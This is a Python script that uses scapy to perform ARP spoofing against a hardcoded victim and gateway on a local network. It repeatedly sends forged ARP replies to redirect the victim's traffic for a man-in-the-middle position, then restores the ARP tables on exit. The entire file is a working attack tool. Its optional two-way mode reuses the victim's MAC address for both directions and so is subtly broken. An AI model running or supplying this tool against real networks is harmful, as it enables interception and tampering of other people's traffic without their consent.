import scapy.all as scapy 
import time 
import sys

victimIP = "192.168.0.117" #machine sending ack in this case
gateway_ip = "192.168.0.132" # Enter your second ip 

if len(sys.argv)>1:
        victimIP =  sys.argv[1]
        gateway_ip = sys.argv[2]

bothways = False

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("No responses received for ARP request.")
        return None


def spoof(victimIP, spoof_ip): 
	packet = scapy.ARP(op = 2, pdst = victimIP, hwdst = targetmac, 
															psrc = spoof_ip) 
	scapy.send(packet, verbose = False) 


def restore(destination_ip, source_ip): 
	destination_mac = get_mac(destination_ip) 
	source_mac = get_mac(source_ip) 
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
	scapy.send(packet, verbose = False) 
	

try: 
    targetmac = get_mac(victimIP)
    sent_packets_count = 0
    while True: 
        spoof(victimIP, gateway_ip)
        if(bothways):
            print("going both ways!") 
            spoof(gateway_ip, victimIP) 


        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
        time.sleep(.5) # Waits for .5sec

except KeyboardInterrupt: 
	print("\nCtrl + C pressed.............Exiting") 
	restore(gateway_ip, victimIP) 
	restore(victimIP, gateway_ip) 
	print("[+] Arp Spoof Stopped") 

